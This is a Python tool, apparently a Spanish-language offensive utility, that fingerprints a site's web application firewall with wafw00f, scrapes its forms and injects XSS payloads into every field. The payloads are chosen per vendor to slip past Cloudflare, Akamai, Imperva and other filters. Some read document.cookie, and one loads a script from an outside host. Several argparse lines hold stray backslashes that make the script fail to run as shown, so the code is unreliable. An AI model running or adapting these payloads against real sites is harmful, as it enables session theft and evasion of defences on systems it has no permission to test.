#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from requests_html import HTMLSession
import requests
import urllib.parse
from bs4 import BeautifulSoup
import signal
from colorama import Fore, Style, init
import subprocess
import argparse
import sys

# Inicializar colorama
init(autoreset=True)


def manejar_salida(sig, frame):
    print(f"\n{Fore.RED}[!] Interrupción detectada. Saliendo...{Style.RESET_ALL}")
    sys.exit(0)


# Capturar Control + C
signal.signal(signal.SIGINT, manejar_salida)


def imprimir_banner():
    'Imprime un banner de bienvenida sencillo.'
    banner = f"""
{Fore.CYAN}tool-waxss{Style.RESET_ALL} - Web XSS & WAF helper
by {Fore.GREEN}TheOffSecGirl{Style.RESET_ALL}
"""
    print(banner)


def detectar_waf(url: str, verbose: bool = True):
    'Detecta la presencia de un WAF usando wafw00f.'
    try:
        resultado = subprocess.run(
            ["wafw00f", url],
            capture_output=True,
            text=True,
            timeout=60,
        )
    except FileNotFoundError:
        if verbose:
            print(
                f"{Fore.RED}[!] wafw00f no está instalado. Instala con 'pip install wafw00f' o 'apt install wafw00f'.{Style.RESET_ALL}"
            )
        return None
    except Exception as e:
        if verbose:
            print(f"{Fore.RED}[!] Error al ejecutar wafw00f: {str(e)}{Style.RESET_ALL}")
        return None

    salida = resultado.stdout or ""
    if "is behind" in salida:
        # wafw00f suele devolver: "<host> is behind <WAF NAME>"
        waf_detectado = salida.split("is behind")[-1].strip()
        if verbose:
            print(
                f"{Fore.YELLOW}[!] Posible WAF detectado: {waf_detectado}{Style.RESET_ALL}"
            )
        return waf_detectado

    if verbose:
        print(f"{Fore.GREEN}[+] No se detectó WAF o no es reconocible.{Style.RESET_ALL}")
    return None


def extraer_formularios(url: str, timeout: int = 20, render_js: bool = True, verbose: bool = False):
    '''
    Extrae formularios HTML de la página objetivo.
    Si render_js es True, intenta renderizar JavaScript (requests-html).
    '''
    session = HTMLSession()
    try:
        if verbose:
            print(f"{Fore.BLUE}[*] Solicitando {url}{Style.RESET_ALL}")
        response = session.get(url, timeout=timeout)

        if render_js:
            if verbose:
                print(f"{Fore.BLUE}[*] Renderizando JavaScript…{Style.RESET_ALL}")
            # Renderizar JS para intentar capturar formularios dinámicos
            response.html.render(timeout=timeout)

        html_content = response.html.html if hasattr(response, "html") else response.text
        soup = BeautifulSoup(html_content, "html.parser")
        forms = soup.find_all("form")

        datos_formularios = []
        for form in forms:
            action = form.get("action")
            full_action = urllib.parse.urljoin(url, action) if action else url
            method = form.get("method", "get").lower()

            inputs = {}
            # Inputs tipo <input>
            for i in form.find_all("input"):
                name = i.get("name")
                if not name:
                    continue
                inputs[name] = i.get("type", "text")

            # Textareas
            for t in form.find_all("textarea"):
                name = t.get("name")
                if not name:
                    continue
                inputs[name] = "textarea"

            # Selects
            for s in form.find_all("select"):
                name = s.get("name")
                if not name:
                    continue
                inputs[name] = "select"

            if not inputs:
                continue

            datos_formularios.append(
                {
                    "url": full_action,
                    "method": method,
                    "inputs": inputs,
                }
            )

        if verbose:
            print(
                f"{Fore.GREEN}[+] Formularios encontrados: {len(datos_formularios)}{Style.RESET_ALL}"
            )

        return datos_formularios

    except requests.RequestException as e:
        print(f"{Fore.RED}[!] Error al extraer formularios: {str(e)}{Style.RESET_ALL}")
        return []


def obtener_payloads(waf_detectado):
    'Devuelve la lista de payloads a usar según el WAF detectado.'
    # Payloads básicos de XSS
    payloads_basicos = [
        "<script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
    ]

    waf_payloads = {
        "akamai": [
            "';k='e'%0Atop //",
            "'><A HRef=' AutoFocus OnFocus=top//?. >",
        ],
        "cloudflare": [
            "<svg/onload=window['al'+'ert'](1337)>",
            "<Svg Only=1 OnLoad=confirm(document.cookie)>",
        ],
        "cloudfront": [
            "'>'><details/open/ontoggle=confirm('XSS')>",
            "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
        ],
        "modsecurity": [
            "<svg onload='new Function[\"Y000!\"].find(alert)'>",
        ],
        "imperva": [
            "<Img Src=//X55.is OnLoad%0C=import(Src)>",
            "<details open ontoggle=prompt(document.cookie)>",
        ],
        "sucuri": [
            "'><img src=x onerror=alert(document.cookie)>",
            "<button onClick='prompt(1337)'>Submit</button>",
        ],
    }

    if not waf_detectado:
        return payloads_basicos

    waf_detectado_lower = waf_detectado.lower()
    for key, waf_list in waf_payloads.items():
        if key in waf_detectado_lower:
            print(
                f"{Fore.MAGENTA}[!] WAF identificado como {waf_detectado}. Usando payloads específicos para {key}.{Style.RESET_ALL}"
            )
            return waf_list + payloads_basicos

    # Si el WAF no está mapeado, usamos los básicos igualmente
    return payloads_basicos


def probar_xss(formularios, waf_detectado, timeout: int = 10, verbose: bool = False):
    'Prueba payloads XSS en los formularios detectados.'
    if not formularios:
        print(f"{Fore.YELLOW}[!] No hay formularios para probar.{Style.RESET_ALL}")
        return

    payloads = obtener_payloads(waf_detectado)

    for form in formularios:
        url = form["url"]
        method = form["method"]
        inputs = form["inputs"]

        print(
            f"{Fore.CYAN}[*] Probando formulario en: {url} (método: {method.upper()}, campos: {', '.join(inputs.keys())}){Style.RESET_ALL}"
        )

        for input_name in inputs:
            for payload in payloads:
                datos = {input_name: payload}
                try:
                    if verbose:
                        short_payload = payload[:60] + ('...' if len(payload) > 60 else '')
                        print(
                            f"{Fore.YELLOW}[~] Payload sobre '{input_name}': {short_payload}{Style.RESET_ALL}"
                        )

                    if method == "post":
                        response = requests.post(
                            url, data=datos, timeout=timeout, verify=True
                        )
                    else:
                        response = requests.get(
                            url, params=datos, timeout=timeout, verify=True
                        )

                    if verbose:
                        print(
                            f"{Fore.GREEN}[~] Respuesta {response.status_code} de {url}{Style.RESET_ALL}"
                        )

                    if payload in response.text:
                        print(
                            f"{Fore.RED}[!] Posible XSS detectado en {url} (campo: {input_name}) con payload:{Style.RESET_ALL}\n    {payload}\n"
                        )
                        # No seguimos probando más payloads sobre este campo
                        break

                except requests.RequestException as e:
                    print(
                        f"{Fore.RED}[!] Error en la solicitud a {url}: {str(e)}{Style.RESET_ALL}"
                    )


def parse_args():
    parser = argparse.ArgumentParser(
        description="tool-waxss – Detección básica de WAF y pruebas de XSS en formularios web."
    )
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="URL objetivo (por ejemplo, https://example.com)",
    )
    parser.add_argument(
        "--skip-waf",
        action="store_true",
        help="No ejecutar detección de WAF con wafw00f.",
    )
    parser.add_argument(
        "--no-js",
        action="store_true",
        help="No intentar renderizar JavaScript (más rápido, menos completo).",\    )
    parser.add_argument(
        "--timeout",\        type=int,
        default=20,
        help="Timeout en segundos para las peticiones HTTP (por defecto 20).",\    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Modo verbose (muestra más información de lo que va haciendo).",\    )
    return parser.parse_args()


def main():
    args = parse_args()
    imprimir_banner()

    waf_detectado = None
    if not args.skip_waf:
        waf_detectado = detectar_waf(args.url, verbose=True)

    formularios = extraer_formularios(
        args.url,
        timeout=args.timeout,
        render_js=not args.no_js,
        verbose=args.verbose,
    )

    if formularios:
        print(
            f"{Fore.GREEN}[+] Se encontraron {len(formularios)} formulario(s). Probando payloads XSS…{Style.RESET_ALL}"
        )
        probar_xss(
            formularios=formularios,
            waf_detectado=waf_detectado,
            timeout=args.timeout,
            verbose=args.verbose,
        )
    else:
        print(f"{Fore.YELLOW}[!] No se encontraron formularios en la página.{Style.RESET_ALL}")


if __name__ == '__main__':
    main()
